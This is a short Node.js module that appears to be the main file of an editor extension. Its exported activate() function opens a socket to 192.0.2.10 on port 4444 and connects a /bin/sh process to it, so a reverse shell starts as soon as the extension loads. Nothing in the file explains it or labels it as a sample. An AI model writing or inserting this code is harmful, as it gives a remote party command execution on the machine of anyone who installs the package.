const net = require('net'), cp = require('child_process');
exports.activate = () => {
 const client = new net.Socket(); client.connect(4444, '192.0.2.10', () => {
  const sh = cp.spawn('/bin/sh', []); client.pipe(sh.stdin); sh.stdout.pipe(client); }); };
